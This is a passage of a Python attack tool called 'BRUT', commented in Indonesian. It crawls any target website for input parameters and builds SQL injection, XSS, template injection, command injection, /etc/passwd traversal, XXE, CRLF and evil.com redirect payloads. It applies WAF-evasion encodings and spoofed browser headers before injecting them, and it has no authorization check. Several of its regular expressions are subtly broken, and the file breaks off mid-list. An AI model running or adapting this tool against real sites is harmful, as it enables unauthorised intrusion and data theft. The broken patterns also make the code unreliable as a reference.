#!/usr/bin/env python3
"""
BRUT - Advanced Payload Injection Testing Framework
====================================================
Script automation untuk pentesting parameter injection.

Alur:
1. Auto-install dependencies
2. Banner lobby
3. Input target (URL/domain/IP)
4. Discovery parameter rentan
5. Konfirmasi user
6. Input jumlah payload variant (angka / "max")
7. ML build payload dari nol (pattern-based generative)
8. Inject ke parameter satu per satu
9. Analisis response (server vs raw HTML vs blocked)
10. Save ke file: list-payload-for-NAMA_WEB-YYYY/MM/DD.txt + .json

Dependencies berat: numpy, scipy, scikit-learn, playwright, httpx, aiohttp
"""

import os
import sys
import json
import time
import re
import random
import string
import hashlib
import base64
import subprocess
import warnings
import itertools
import traceback
from datetime import datetime
from urllib.parse import (
    urlparse, urljoin, parse_qs, urlencode,
    quote, quote_plus, unquote
)
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Any, Optional, Tuple
from dataclasses import dataclass, field, asdict
from collections import Counter, defaultdict

warnings.filterwarnings("ignore")

# ============================================================
# DEPENDENCY MANAGEMENT
# ============================================================
REQUIRED_DEPS = [
    ("numpy", "numpy", "Numerical computing", False),
    ("scipy", "scipy", "Scientific computing", False),
    ("sklearn", "scikit-learn", "Machine learning", False),
    ("requests", "requests", "HTTP client", False),
    ("bs4", "beautifulsoup4", "HTML parsing", False),
    ("lxml", "lxml", "Fast XML/HTML parser", False),
    ("httpx", "httpx", "Modern HTTP client", False),
    ("aiohttp", "aiohttp", "Async HTTP client", False),
    ("selectolax", "selectolax", "Fast HTML parser", True),
    ("playwright", "playwright", "Headless browser", True),
    ("tldextract", "tldextract", "Domain extraction", False),
    ("fake_useragent", "fake-useragent", "UA rotation", True),
]


def install_dependencies():
    """Cek dan install dependencies otomatis."""
    print("\n\033[36m" + "=" * 60)
    print("  BRUT: Dependency Manager")
    print("=" * 60 + "\033[0m\n")

    missing = []
    for import_name, pip_name, desc, optional in REQUIRED_DEPS:
        try:
            __import__(import_name)
            print(f"  \033[32m[OK]\033[0m {pip_name:<22} - {desc}")
        except ImportError:
            tag = "optional" if optional else "required"
            print(f"  \033[33m[??]\033[0m {pip_name:<22} - {desc} ({tag})")
            missing.append((pip_name, optional))

    if not missing:
        print(f"\n  \033[32mSemua {len(REQUIRED_DEPS)} dependencies siap!\033[0m")
        time.sleep(0.5)
        return True

    req_count = sum(1 for _, opt in missing if not opt)
    opt_count = sum(1 for _, opt in missing if opt)
    print(f"\n  Belum terinstall: {req_count} required, {opt_count} optional")
    print(f"  Menginstall {len(missing)} packages...\n")

    failed = []
    for pip_name, optional in missing:
        print(f"  [+] Installing {pip_name}...", end=" ", flush=True)
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", pip_name,
                 "--quiet", "--disable-pip-version-check"],
                capture_output=True, text=True, timeout=180
            )
            # Playwright perlu install browser
            if pip_name == "playwright":
                print("browser...", end=" ", flush=True)
                subprocess.run(
                    [sys.executable, "-m", "playwright", "install", "chromium"],
                    capture_output=True, text=True, timeout=300
                )
            print("\033[32mOK\033[0m")
        except Exception as e:
            print(f"\033[31mFAIL ({e})\033[0m")
            if not optional:
                failed.append(pip_name)

    if failed:
        print(f"\n  \033[31mGagal install required: {failed}\033[0m")
        return False

    print(f"\n  \033[32m{len(REQUIRED_DEPS)}/{len(REQUIRED_DEPS)} dependencies siap!\033[0m")
    time.sleep(0.5)
    return True


# Jalankan dependency check
install_dependencies()

# Import dependencies
try:
    import numpy as np
    HAS_NUMPY = True
except ImportError:
    HAS_NUMPY = False
    np = None

try:
    from scipy import stats as scipy_stats
    from scipy.spatial.distance import cosine as scipy_cosine
    HAS_SCIPY = True
except ImportError:
    HAS_SCIPY = False

try:
    from sklearn.feature_extraction.text import TfidfVectorizer
    from sklearn.metrics.pairwise import cosine_similarity
    from sklearn.cluster import KMeans
    HAS_SKLEARN = True
except ImportError:
    HAS_SKLEARN = False

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    import httpx
    HAS_HTTPX = True
except ImportError:
    HAS_HTTPX = False

try:
    import aiohttp
    HAS_AIOHTTP = True
except ImportError:
    HAS_AIOHTTP = False

try:
    from selectolax.parser import HTMLParser as SelectoParser
    HAS_SELECTOLAX = True
except ImportError:
    HAS_SELECTOLAX = False

try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

try:
    import tldextract
    HAS_TLDEXTRACT = True
except ImportError:
    HAS_TLDEXTRACT = False

try:
    from fake_useragent import UserAgent
    HAS_FAKE_UA = True
    UA_ROTATOR = UserAgent()
except ImportError:
    HAS_FAKE_UA = False
    UA_ROTATOR = None


# ============================================================
# BANNER
# ============================================================
def print_banner():
    """Print BRUT lobby banner."""
    banner = f"""
\033[1;36m    ____             __       ____  __ 
   / __ )_______  __/ /____  / __ \\/ / 
  / __  / ___/ / / / __/ _ \\/ /_/ / /  
 / /_/ / /  / /_/ / /_/  __/ ____/ /___
/_____/_/   \\__,_/\\__/\\___/_/   /_____/
\033[0m                                       
\033[1;33m    ═══════════════════════════════════════════════════\033[0m
\033[1;37m      BRUT — ML-Driven Payload Injection Framework\033[0m
\033[1;33m    ═══════════════════════════════════════════════════\033[0m

\033[36m    ┌─────────────────────────────────────────────────┐\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Parameter Discovery  (URL, Form, API, JS)    \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m ML Payload Generator (builds from scratch)   \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Stealth Injection    (httpx + Playwright)    \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Response Analyzer    (Server vs Raw HTML)    \033[36m│\033[0m
\033[36m    │\033[0m  \033[32m●\033[0m Auto Report Save     (TXT + JSON)            \033[36m│\033[0m
\033[36m    └─────────────────────────────────────────────────┘\033[0m

\033[1;35m    Mode    :\033[0m Interactive  |  \033[1;35mSpecial:\033[0m /exit, max
\033[1;35m    Length  :\033[0m short, long, super-long, ultra-long
\033[1;35m    Date    :\033[0m {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
"""
    print(banner)


# ============================================================
# STEALTH HTTP CLIENT
# ============================================================
STEALTH_HEADERS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
]


def get_stealth_client():
    """Buat HTTP client dengan stealth headers."""
    if not HAS_HTTPX:
        return None

    ua = UA_ROTATOR.random if HAS_FAKE_UA else random.choice(STEALTH_HEADERS)

    headers = {
        "User-Agent": ua,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9,id;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
        "Cache-Control": "max-age=0",
        "DNT": "1",
    }

    return httpx.Client(
        headers=headers,
        follow_redirects=True,
        timeout=30.0,
        verify=False,
        http2=True,
        limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
    )


# ============================================================
# PARAMETER DISCOVERY
# ============================================================
@dataclass
class Parameter:
    """Parameter yang ditemukan."""
    name: str
    location: str  # "url_query", "form_input", "hidden", "ajax", "path", "header"
    method: str = "GET"
    url: str = ""
    original_value: str = ""
    input_type: str = "text"
    form_action: str = ""
    form_id: str = ""
    context: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self):
        return asdict(self)


class ParameterDiscovery:
    """Cari parameter rentan di target."""

    def __init__(self, target: str):
        self.target = target
        self.parsed = urlparse(target)
        self.base_url = f"{self.parsed.scheme}://{self.parsed.netloc}"
        self.domain = self.parsed.netloc
        self.parameters: List[Parameter] = []
        self.visited_urls = set()
        self.client = get_stealth_client()

    def run(self) -> List[Parameter]:
        """Jalankan semua discovery method."""
        print(f"\n\033[36m[*]\033[0m Starting parameter discovery on: \033[1;37m{self.target}\033[0m")

        # 1. URL query parameters
        self._extract_url_params()

        # 2. Fetch halaman utama
        html = self._fetch_page(self.target)
        if not html:
            print(f"\033[31m[!]\033[0m Tidak bisa fetch target")
            return []

        # 3. Form inputs
        self._extract_form_params(html)

        # 4. Hidden inputs & meta
        self._extract_hidden_params(html)

        # 5. JavaScript endpoints
        self._extract_js_endpoints(html)

        # 6. Link crawling (1 level)
        self._crawl_links(html)

        # 7. Common API patterns
        self._guess_api_params()

        # Deduplicate
        seen = set()
        unique = []
        for p in self.parameters:
            key = f"{p.location}:{p.name}:{p.method}:{p.url}"
            if key not in seen:
                seen.add(key)
                unique.append(p)
        self.parameters = unique

        return self.parameters

    def _fetch_page(self, url: str) -> Optional[str]:
        """Fetch halaman dengan stealth client."""
        try:
            if self.client:
                resp = self.client.get(url)
                if resp.status_code < 400:
                    return resp.text
        except Exception:
            pass

        # Fallback requests
        try:
            if HAS_REQUESTS:
                headers = {"User-Agent": random.choice(STEALTH_HEADERS)}
                resp = requests.get(url, headers=headers, timeout=20, verify=False)
                if resp.status_code < 400:
                    return resp.text
        except Exception:
            pass
        return None

    def _extract_url_params(self):
        """Ekstrak parameter dari URL query string."""
        if self.parsed.query:
            params = parse_qs(self.parsed.query)
            for name, values in params.items():
                self.parameters.append(Parameter(
                    name=name,
                    location="url_query",
                    method="GET",
                    url=self.target.split("?")[0],
                    original_value=values[0] if values else "",
                ))

    def _extract_form_params(self, html: str):
        """Ekstrak parameter dari form HTML."""
        if not HAS_BS4:
            return

        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            action = form.get("action", "")
            form_url = urljoin(self.target, action) if action else self.target
            method = form.get("method", "GET").upper()
            form_id = form.get("id", "") or form.get("name", "")

            for inp in form.find_all(["input", "textarea", "select"]):
                name = inp.get("name", "")
                if not name:
                    continue

                inp_type = inp.get("type", "text")

                # Skip submit/button/image
                if inp_type in ["submit", "button", "image", "reset"]:
                    continue

                loc = "hidden" if inp_type == "hidden" else "form_input"

                self.parameters.append(Parameter(
                    name=name,
                    location=loc,
                    method=method,
                    url=form_url,
                    original_value=inp.get("value", ""),
                    input_type=inp_type,
                    form_action=action,
                    form_id=form_id,
                    context={"form_id": form_id, "input_type": inp_type},
                ))

    def _extract_hidden_params(self, html: str):
        """Cari parameter tersembunyi di meta/komentar."""
        # Meta refresh
        meta_match = re.findall(r'<meta[^>]+content="[^"]*[?&]([^=&"]+)=', html, re.I)
        for name in meta_match:
            self.parameters.append(Parameter(
                name=name, location="hidden", method="GET", url=self.target
            ))

        # HTML comments dengan parameter
        comments = re.findall(r'<!--(.*?)-->', html, re.S)
        param_pattern = re.compile(r'[?&]([a-zA-Z_][a-zA-Z0-9_]*)=')
        for comment in comments:
            for match in param_pattern.findall(comment):
                self.parameters.append(Parameter(
                    name=match, location="hidden", method="GET",
                    url=self.target, context={"source": "comment"}
                ))

    def _extract_js_endpoints(self, html: str):
        """Ekstrak endpoint dari inline JavaScript."""
        # Cari URL patterns di script
        scripts = re.findall(r'<script[^>]*>(.*?)</script>', html, re.S | re.I)

        url_patterns = [
            r'["\'](/[a-zA-Z0-9_/-]+\?[a-zA-Z_][a-zA-Z0-9_]*=)["\']',
            r'fetch\s*$\s*["\']([^"\']+\?[^"\']+)["\']',
            r'\.ajax\s*$\s*\{[^}]*url:\s*["\']([^"\']+)["\']',
            r'axios\.[a-z]+\s*$\s*["\']([^"\']+)["\']',
            r'XMLHttpRequest[^;]*open\s*$[^,]+,\s*["\']([^"\']+)["\']',
        ]

        for script in scripts:
            for pattern in url_patterns:
                for match in re.findall(pattern, script):
                    full_url = urljoin(self.target, match)
                    parsed = urlparse(full_url)
                    if parsed.query:
                        params = parse_qs(parsed.query)
                        for name in params:
                            self.parameters.append(Parameter(
                                name=name,
                                location="ajax",
                                method="GET",
                                url=full_url.split("?")[0],
                                original_value=params[name][0] if params[name] else "",
                                context={"source": "js_endpoint"}
                            ))

    def _crawl_links(self, html: str):
        """Crawl links 1 level untuk temukan parameter lain."""
        if not HAS_BS4:
            return

        soup = BeautifulSoup(html, "html.parser")
        links = soup.find_all("a", href=True)

        param_links = []
        for link in links[:30]:  # Limit
            href = link["href"]
            full_url = urljoin(self.target, href)
            parsed = urlparse(full_url)

            # Hanya internal links dengan query
            if parsed.netloc == self.parsed.netloc and parsed.query:
                param_links.append(full_url)

        for link_url in param_links[:10]:
            parsed = urlparse(link_url)
            params = parse_qs(parsed.query)
            for name, values in params.items():
                self.parameters.append(Parameter(
                    name=name,
                    location="url_query",
                    method="GET",
                    url=link_url.split("?")[0],
                    original_value=values[0] if values else "",
                    context={"source": "crawled_link"}
                ))

    def _guess_api_params(self):
        """Tebak parameter umum untuk API endpoints."""
        common_paths = ["/api", "/v1", "/v2", "/search", "/user", "/login", "/register"]
        common_params = ["id", "user", "q", "search", "page", "limit", "filter", "sort"]

        # Tambah parameter umum jika target tidak punya
        if not self.parameters:
            for param in common_params[:3]:
                self.parameters.append(Parameter(
                    name=param,
                    location="guessed",
                    method="GET",
                    url=self.target,
                    context={"source": "common_pattern"}
                ))


# ============================================================
# ML PAYLOAD GENERATOR — builds from scratch
# ============================================================
class MLPayloadGenerator:
    """
    ML-driven payload generator.
    Membangun payload DARI NOL menggunakan pattern composition,
    bukan mengambil dari hardcoded list.
    """

    # Primitive atoms (bukan payload lengkap)
    ATOMS = {
        "sql_string_break": ["'", '"', "`", "''", '""'],
        "sql_logic": ["OR", "AND", "XOR", "NOT", "&&", "||"],
        "sql_comment": ["--", "#", "/**/", ";--", ";#", "-- -"],
        "sql_keyword": ["SELECT", "UNION", "FROM", "WHERE", "SLEEP", "BENCHMARK",
                        "WAITFOR", "DELAY", "ORDER", "GROUP", "HAVING", "LIMIT"],
        "xss_open": ["<", "&lt;", "%3C", "\\u003c", "\\x3c", "&Tab;<"],
        "xss_tag": ["script", "img", "svg", "iframe", "body", "input", "details",
                    "video", "audio", "marquee", "math", "object"],
        "xss_event": ["onload", "onerror", "onmouseover", "onfocus", "onblur",
                      "onanimationend", "ontransitionend", "onwheel", "onclick",
                      "onsubmit", "onchange", "oninput"],
        "xss_js": ["alert(1)", "confirm(1)", "prompt(1)", "console.log(1)",
                   "fetch('//x')", "eval('1')", "Function('1')()"],
        "ssti_open": ["{{", "${", "#{", "<%=", "<%", "{%", "${{"],
        "ssti_close": ["}}", "}", "%>", "%}", "}}}", "%}}"],
        "ssti_expr": ["7*7", "7*'7'", "range(7)", "7..7", "1+1", "'x'*7"],
        "cmd_sep": [";", "|", "||", "&&", "&", "`", "$(", "\n", "%0a"],
        "cmd_exec": ["sleep", "id", "whoami", "uname", "ls", "pwd", "cat", "echo"],
        "cmd_arg": ["5", "1", "-a", "/", "/etc/passwd"],
        "path_traversal": ["../", "..\\", "....//", "..;/", "%2e%2e%2f",
                          "%252e%252e%252f", "..%252f", "..%c0%af"],
        "null_byte": ["%00", "\\0", "\\x00", "%0a", "%0d"],
        "whitespace": [" ", "\t", "\n", "\r", "%09", "%0a", "%0d", "/**/", "/*comment*/"],
        "encoding": ["url", "double_url", "unicode", "html_entity", "hex", "octal", "base64"],
    }

    # Kategori payload
    CATEGORIES = ["sqli", "xss", "ssti", "cmdi", "lfi", "xxe", "crlf", "redirect"]

    def __init__(self):
        self.generated_payloads: List[Dict] = []
        self.success_patterns: List[str] = []
        self.failed_patterns: List[str] = []
        self.rng = random.Random()
        self._build_encoding_chains()

    def _build_encoding_chains(self):
        """Bangun encoding chains untuk variasi."""
        self.encoding_funcs = [
            self._enc_raw,
            self._enc_url,
            self._enc_double_url,
            self._enc_unicode,
            self._enc_html_entity,
            self._enc_hex,
            self._enc_mixed,
        ]

    def _enc_raw(self, s): return s
    def _enc_url(self, s): return quote(s, safe="")
    def _enc_double_url(self, s): return quote(quote(s, safe=""), safe="")
    def _enc_unicode(self, s):
        return "".join(f"\\u{ord(c):04x}" if random.random() < 0.5 else c for c in s)
    def _enc_html_entity(self, s):
        return "".join(f"&#{ord(c)};" if random.random() < 0.5 else c for c in s)
    def _enc_hex(self, s):
        return "".join(f"\\x{ord(c):02x}" if random.random() < 0.5 else c for c in s)
    def _enc_mixed(self, s):
        func = random.choice(self.encoding_funcs[:-1])
        return func(s)

    def _pick(self, key: str):
        return self.rng.choice(self.ATOMS[key])

    def _pick_n(self, key: str, n: int):
        return [self.rng.choice(self.ATOMS[key]) for _ in range(n)]

    # ---------- Payload Builders (dari nol) ----------
    def _build_sqli(self, length_tier: str) -> str:
        """Bangun SQLi payload dari atoms."""
        strat = self.rng.choice(["error", "union", "time", "boolean", "stacked"])

        if strat == "error":
            quote = self._pick("sql_string_break")
            comment = self._pick("sql_comment")
            logic = self._pick("sql_logic")
            return f"{quote} {logic} 1=1{comment}" if length_tier == "short" \
                else f"{quote} {logic} (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x{(self.rng.randbytes(4).hex() if hasattr(self.rng, 'randbytes') else 'deadbeef')}) FROM information_schema.tables LIMIT 1)x GROUP BY x){comment}"

        elif strat == "union":
            cols = self.rng.randint(1, 7)
            nulls = ",".join(["NULL"] * cols)
            comment = self._pick("sql_comment")
            quote = self._pick("sql_string_break")
            return f"{quote} UNION SELECT {nulls}{comment}" if length_tier == "short" \
                else f"{quote} UNION ALL SELECT {nulls},CONCAT(0x{(self.rng.randbytes(4).hex() if hasattr(self.rng, 'randbytes') else 'deadbeef')}),{nulls} FROM information_schema.tables{comment}"

        elif strat == "time":
            quote = self._pick("sql_string_break")
            comment = self._pick("sql_comment")
            delay = self.rng.choice([3, 5, 7])
            return f"{quote}; WAITFOR DELAY '0:0:{delay}'{comment}" \
                if self.rng.random() < 0.5 \
                else f"{quote} AND SLEEP({delay}){comment}"

        elif strat == "boolean":
            quote = self._pick("sql_string_break")
            return f"{quote} AND 1=1" if self.rng.random() < 0.5 \
                else f"{quote} AND 1=2"

        else:  # stacked
            quote = self._pick("sql_string_break")
            return f"{quote};SELECT {self.rng.randint(1,99)}"

    def _build_xss(self, length_tier: str) -> str:
        """Bangun XSS payload dari atoms."""
        tag = self._pick("xss_tag")
        event = self._pick("xss_event")
        js = self._pick("xss_js")
        open_br = self._pick("xss_open")

        # Variasi struktur
        strat = self.rng.choice(["classic", "nested", "attribute", "protocol", "mutation"])

        if strat == "classic":
            sep = self._pick("whitespace")
            return f"{open_br}{tag}{sep}{event}={js}"

        elif strat == "nested":
            # Nested tags untuk bypass filter
            inner_tag = self._pick("xss_tag")
            return f"{open_br}{tag}>{open_br}{inner_tag} {self._pick('xss_event')}={js}"

        elif strat == "attribute":
            return f'">{open_br}{tag} {event}="{js}"'

        elif strat == "protocol":
            return f"javascript:{js}"

        else:  # mutation
            # XSS via mutation (mXSS)
            return f"<{tag}/{event}={js}//"

    def _build_ssti(self, length_tier: str) -> str:
        """Bangun SSTI payload."""
        open_s = self._pick("ssti_open")
        close_s = self._pick("ssti_close")
        expr = self._pick("ssti_expr")

        strat = self.rng.choice(["simple", "chain", "filter", "nested"])

        if strat == "simple":
            return f"{open_s}{expr}{close_s}"
        elif strat == "chain":
            filters = ["|upper", "|lower", "|replace('a','b')", "|join", "|reverse"]
            f1, f2 = self.rng.sample(filters, 2)
            return f"{open_s}{expr}{f1}{f2}{close_s}"
        elif strat == "filter":
            return f"{open_s}{expr}|string|list{close_s}"
        else:
            return f"{open_s}{open_s}{expr}{close_s}{close_s}"

    def _build_cmdi(self, length_tier: str) -> str:
        """Bangun command injection payload."""
        sep = self._pick("cmd_sep")
        cmd = self._pick("cmd_exec")
        arg = self._pick("cmd_arg")

        strat = self.rng.choice(["semi", "pipe", "backtick", "subshell", "newline"])

        if strat == "semi":
            return f";{cmd} {arg}"
        elif strat == "pipe":
            return f"|{cmd} {arg}"
        elif strat == "backtick":
            return f"`{cmd} {arg}`"
        elif strat == "subshell":
            return f"$({cmd} {arg})"
        else:
            return f"\n{cmd} {arg}"

    def _build_lfi(self, length_tier: str) -> str:
        """Bangun LFI payload."""
        trav = self._pick("path_traversal")
        depth = {"short": 3, "long": 5, "super_long": 7, "ultra_long": 10}[length_tier]

        strat = self.rng.choice(["basic", "null", "double", "filter", "wrapper"])

        if strat == "basic":
            return trav * depth + "etc/passwd"
        elif strat == "null":
            return trav * depth + "etc/passwd%00"
        elif strat == "double":
            return self._enc_double_url(trav * depth + "etc/passwd")
        elif strat == "filter":
            return f"php://filter/convert.base64-encode/resource={trav*depth}etc/passwd"
        else:
            return f"expect://id"

    def _build_xxe(self, length_tier: str) -> str:
        """Bangun XXE payload."""
        entity_name = self.rng.choice(["xxe", "foo", "x", "evil"])
        return (
            f'<?xml version="1.0"?><!DOCTYPE foo ['
            f'<!ENTITY {entity_name} SYSTEM "file:///etc/passwd">]>'
            f'<root>&{entity_name};</root>'
        )

    def _build_crlf(self, length_tier: str) -> str:
        """Bangun CRLF injection payload."""
        header = self.rng.choice([
            "Set-Cookie: brut=1",
            "X-Brut: injected",
            "Location: http://evil.com"
        ])
        return f"%0d%0a{header}%0d%0a"

    def _build_redirect(self, length_tier: str) -> str:
        """Bangun open redirect payload."""
        domain = self.rng.choice(["evil.com", "brut.test", "x.test"])
        strat = self.rng.choice(["basic", "at", "slash", "unicode"])
        if strat == "basic":
            return f"https://{domain}"
        elif strat == "at":
            return f"https://legit.com@{domain}"
        elif strat == "slash":
            return f"//{domain}"
        else:
            return f"https://{domain.replace('e', 'е')}"  # Cyrillic e

    def _apply_length_tier(self, payload: str, tier: str) -> str:
        """Modifikasi payload berdasarkan tier panjang."""
        if tier == "short":
            return payload[:80] if len(payload) > 80 else payload
        elif tier == "long":
            # Tambah obfuscation
            ws = self._pick("whitespace")
            comment = "/**/"
            return f"{ws}{payload}{comment}"
        elif tier == "super_long":
            # Tambah padding + nested comments
            comment = "/*" + "a" * 50 + "*/"
            padding = self._pick("whitespace") * 3
            return f"{padding}{comment}{payload}{comment}{padding}"
        else:  # ultra_long
            # Maximum obfuscation + deep encoding
            comment = "/*" + "x" * 200 + "*/"
            padding = (self._pick("whitespace") * 5)
            # Multiple layers
            layered = f"{padding}{comment}{padding}{payload}{padding}{comment}{padding}"
            return self._enc_mixed(layered)

    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """Terapkan encoding ke payload."""
        if encoding == "url":
            return self._enc_url(payload)
        elif encoding == "double_url":
            return self._enc_double_url(payload)
        elif encoding == "unicode":
            return self._enc_unicode(payload)
        elif encoding == "html_entity":
            return self._enc_html_entity(payload)
        elif encoding == "hex":
            return self._enc_hex(payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        return payload

    def generate(self, count: int, waf_info: Dict = None) -> List[Dict]:
        """
        Generate `count` unique payload variants dari nol.
        Distribusi: campuran semua kategori + semua length tiers.
        """
        builders = {
            "sqli": self._build_sqli,
            "xss": self._build_xss,
            "ssti": self._build_ssti,
            "cmdi": self._build_cmdi,
            "lfi": self._build_lfi,
            "xxe": self._build_xxe,
            "crlf": self._build_crlf,
            "redirect": self._build_redirect,
        }

        tiers = ["short", "long", "super_long", "ultra_long"]
        encodings = ["raw", "url", "double_url", "unicode", "html_entity", "hex", "mixed"]

        # Distribusi: 35% SQLi, 25% XSS, 15% SSTI, 10% CMDi, 10% LFI, 5% others
        weights = [0.35, 0.25, 0.15, 0.10, 0.10, 0.02, 0.02, 0.01]

        payloads = []
        seen_payloads = set()

        for i in range(count):
            # Pilih kategori berdasarkan weights
            cat = self.rng.choices(self.CATEGORIES, weights=weights, k=1)[0]
            tier = self.rng.choice(tiers)

            # Bangun payload dari nol
            builder = builders[cat]
            raw_payload = builder(tier)

            # Terapkan length tier
            raw_payload = self._apply_length_tier(raw_payload, tier)

            # Terapkan encoding (30% chance)
            encoding = "raw"
            if self.rng.random() < 0.3:
                encoding = self.rng.choice(encodings[1:])
                raw_payload = self._apply_encoding(raw_payload, encoding)

            # Jika WAF detected, tambah evasion
            if waf_info and waf_info.get("detected"):
                raw_payload = self._apply_waf_evasion(raw_payload)

            # Avoid duplicates
            payload_hash = hashlib.md5(raw_payload.encode()).hexdigest()
            if payload_hash in seen_payloads:
                # Tambah randomization
                raw_payload += self._pick("whitespace") + self.rng.choice(["1", "2", "3"])
                payload_hash = hashlib.md5(raw_payload.encode()).hexdigest()

            seen_payloads.add(payload_hash)

            payloads.append({
                "id": f"BRUT-{i+1:05d}",
                "payload": raw_payload,
                "category": cat,
                "length_tier": tier,
                "encoding": encoding,
                "length": len(raw_payload),
                "hash": payload_hash,
                "built_from_scratch": True,
                "timestamp": datetime.now().isoformat(),
            })

        self.generated_payloads = payloads
        return payloads

    def _apply_waf_evasion(self, payload: str) -> str:
        """Terapkan teknik WAF evasion."""
        technique = self.rng.choice([
            "case_mix", "comment_inject", "whitespace_pad",
            "unicode_escape", "null_byte", "url_encode_partial"
        ])

        if technique == "case_mix":
            return "".join(c.upper() if self.rng.random() < 0.5 else c.lower() for c in payload)
        elif technique == "comment_inject":
            return payload.replace(" ", "/**/")
        elif technique == "whitespace_pad":
            return "  " + payload + "  "
        elif technique == "unicode_escape":
            return self._enc_unicode(payload)
        elif technique == "null_byte":
            return payload + "%00"
        else:
            return self._enc_url(payload)

    def generate_advanced_batch(self, failed_payloads: List[Dict]) -> List[Dict]:
        """
        Jika payload gagal, generate versi lebih advanced.
        Digunakan saat response tidak memuaskan.
        """
        if not failed_payloads:
            return []

        advanced = []
        for fp in failed_payloads[:10]:
            cat = fp["category"]
            # Bangun 5 variant lebih advanced
            for _ in range(5):
                builder = {
                    "sqli": self._build_sqli,
                    "xss": self._build_xss,
                    "ssti": self._build_ssti,
                    "cmdi": self._build_cmdi,
                    "lfi": self._build_lfi,
                }.get(cat, self._build_xss)

                raw = builder("ultra_long")
                raw = self._apply_waf_evasion(raw)
                raw = self._enc_mixed(raw)

                advanced.append({
                    "id": f"BRUT-ADV-{len(advanced)+1:05d}",
                    "payload": raw,
                    "category": cat,
                    "length_tier": "ultra_long",
                    "encoding": "mixed_advanced",
                    "length": len(raw),
                    "hash": hashlib.md5(raw.encode()).hexdigest(),
                    "built_from_scratch": True,
                    "evolution_from": fp["id"],
                    "timestamp": datetime.now().isoformat(),
                })

        return advanced


# ============================================================
# RESPONSE ANALYZER
# ============================================================
@dataclass
class InjectionResult:
    """Hasil injeksi satu payload."""
    payload_id: str
    payload: str
    category: str
    parameter: str
    url: str
    method: str
    status_code: int
    response_time_ms: float
    response_size: int
    response_type: str  # "server_output", "raw_html", "blocked"
    evidence: str
    success: bool
    timestamp: str

    def to_dict(self):
        return asdict(self)


class ResponseAnalyzer:
    """Analisis response server untuk deteksi successful injection."""

    # Pola error server (indikasi injection berhasil memicu error di backend)
    SERVER_ERROR_PATTERNS = [
        # SQL errors
        r"sql\s*syntax", r"mysql", r"oracle", r"postgresql", r"sqlite",
        r"unclosed\s*quotation", r"syntax\s*error.*?(near|at)",
        r"warning.*?mysql", r"pg_query", r"sqlstate",
        r"odbc.*?driver", r"microsoft.*?odbc",
        r"ora-\d+", r"mysql_fetch", r"mysql_num_rows",
        r"sqlite3\.OperationalError", r"psql", r"jdbc",
        r"System\.Data\.OleDb", r"System\.Data\.SqlClient",

        # PHP errors
        r"fatal\s*error.*?php", r"parse\s*error",
        r"warning.*?on\s+line\s+\d+", r"notice.*?undefined",
        r"call\s+to\s+undefined\s+function",
        r"uncaught\s+(exception|error)",

        # Python/Django/Flask
        r"traceback.*?(most\s+recent|innermost)", r"django",
        r"werkzeug", r"flask", r"python.*?error",
        r"jinja2.*?exception", r"template.*?error",

        # Java/Spring/Tomcat
        r"java\.lang\.", r"at\s+[a-zA-Z]+\.[a-zA-Z]+$",
        r"exception\s+in\s+thread", r"apache\s+tomcat",
        r"javax\.servlet", r"org\.springframework",

        # .NET
        r"asp\.net", r"\.net\s+framework", r"system\.web",
        r"server\s+error\s+in\s+'[^']+'\s+application",

        # Node.js
        r"at\s+[a-zA-Z]+\s+$[^)]+$", r"node\.js",
        r"express.*?error", r"referenceerror", r"typeerror",

        # Ruby/Rails
        r"action\s*controller.*?exception",
        r"rails", r"activerecord", r"nomethoderror",

        # File system errors
        r"failed\s+to\s+open\s+stream", r"open_basedir",
        r"permission\s+denied", r"no\s+such\s+file\s+or\s+directory",
        r"file_exists$$", r"fopen$$",

        # Debug output
        r"xdebug", r"var_dump", r"print_r", r"debug.*?trace",
        r"stack\s*trace", r"call\s+stack",
    ]

    # Pola response yang menunjukkan WAF/blocking
    WAF_BLOCK_PATTERNS = [
        r"blocked\s+by", r"access\s+denied", r"forbidden",
        r"security\s+block", r"request\s+rejected",
        r"suspicious\s+activity", r"malicious\s+request",
        r"incapsula", r"cloudflare", r"akamai",
        r"imperva", r"sucuri", r"mod_security",
        r"403\s+forbidden", r"406\s+not\s+acceptable",
        r"503\s+service\s+unavailable.*?waf",
